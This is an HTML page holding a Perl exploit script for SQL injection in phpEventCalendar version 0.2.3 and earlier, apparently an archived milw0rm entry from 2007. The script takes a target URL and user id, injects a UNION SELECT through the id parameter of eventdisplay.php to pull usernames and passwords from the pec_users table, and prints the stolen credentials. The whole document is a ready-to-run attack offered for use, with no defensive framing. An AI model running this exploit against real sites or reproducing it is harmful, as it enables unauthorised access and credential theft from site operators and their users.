<html><head><title>phpEventCalendar <= 0.2.3 (eventdisplay.php) SQL Injection Exploit </title></head><pre>#!/usr/bin/perl
#
#	Vendor url: www.ikemcg.com
#
require LWP::UserAgent;

print &quot;#
# phpEventCalendar &lt;= v0.2.3 SQL Injection Exploit
# By Iron - ironwarez.info
# Thanks to Silentz for the help :)
# Greets to everyone at RootShell Security Group &amp; dHack
#
# Example target url: http://www.target.com/phpeventcalendar/
Target url?&quot;;
chomp($target=&lt;stdin&gt;);
if($target !~ /^http:\/\//)
{
	$target = &quot;http://&quot;.$target;
}
if($target !~ /\/$/)
{
	$target .= &quot;/&quot;;
}
print &quot;User id to retrieve name/password from? (1 = admin)&quot;;
chomp($target_id=&lt;stdin&gt;);
$target .= &quot;eventdisplay.php?id=-999%20UNION%20SELECT%20username,password,password%20FROM%20pec_users%20WHERE%20uid=&quot;.$target_id;

$ua = LWP::UserAgent-&gt;new;
$ua-&gt;timeout(10);
$ua-&gt;env_proxy;

$response = $ua-&gt;get($target);

if ($response-&gt;is_success)
{
	if($response-&gt;content =~ /&lt;span class=&quot;display_header&quot;&gt;(.*)&lt;\/span&gt;/i)
	{
		($username,$password) = split(/,/,$1);
		print &quot;Username: &quot;.$username;
		print &quot;\nPassword: &quot;.$password;
	}
	else
	{
		print &quot;\nUnable to retrieve username/password.&quot;;
	}
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}

# milw0rm.com [2007-07-01]</pre></html>